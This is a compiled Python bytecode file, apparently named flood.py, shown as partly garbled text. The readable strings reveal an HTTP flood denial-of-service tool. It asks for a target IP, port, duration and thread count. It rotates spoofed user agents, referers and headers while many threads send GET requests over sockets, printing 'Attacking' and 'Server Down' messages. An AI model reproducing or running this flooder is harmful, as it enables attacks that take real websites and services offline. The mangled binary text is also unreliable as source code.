a
    Ň?c  ?                   @   s?   d dl Z d dlZd dlZd dlZg d?ag d?ag d?aeed??Z	e
ed??Ze
ed??Ze
ed??Zd	d
? Zee?D ]Zejed?Ze??  qxdS )?    N)zZMozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1zWMozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1zBMozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1z?Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0zUMozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1zcMozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2z?Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0zGMozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0zCMozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zOMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zjMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1zbMozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3z`Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0zFMozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)zPMozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016)zhttp://www.bing.com/search?q=z'https://www.yandex.com/yandsearch?text=zhttps://duckduckgo.com/?q=)z?Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
z Accept-Encoding: gzip, deflate
zAAccept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
z?Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Charset: iso-8859-1
z?Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
Accept-Charset: utf-8, iso-8859-1;q=0.5
z?Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*
Accept-Language: en-US,en;q=0.5
a	  Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Encoding: gzip
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
z!Accept-Language: en-US,en;q=0.5
z[+] Target: z
[+] Port: z[+] Time/s: z[+] Threads: c                  C   s*  t ?d?} td?}dt ?t? d }t ?t?}dt ?t? tt? d }d}d}d?	tt?tt
??}|| | | | | d }z?t?tjtj?}	|	?tt?tt
?f? |	?t?|?? tt?D ]}
|	?t?|?? q?|t ?dtt??7 }td	?	tt?tt
?|?? W q?   |	??  td
? Y q?0 q?d S )Ni?  r   zUser-Agent: z
z	Referer: z1Content-Type: application/x-www-form-urlencoded
z,Content-Length: 0 
Connection: Keep-Alive
zGET / HTTP/1.1
Host: {0}:{1}
z3[Haminhtriet] Attacking Monster {0}:{1} | Sent: {2}z[Haminhtriet] Server Down.)?randomZ_urandom?intZchoice?
useragents?	acceptall?ref?str?ip?format?port?socketZAF_INETZSOCK_STREAMZconnect?send?encode?range?packZrandint?print?close)ZhhZxxZuseragenZacceptZrefferZcontentZlengthZtarget_hostZmain_req?s?i? r   ?/root/flood.py?start'   s(    

r   )?target)r   Zrequestsr   Z	threadingr   r   r   r   ?inputr   r   r
   r   ?threadr   r   ?xZThreadZthredr   r   r   r   ?<module>   s   
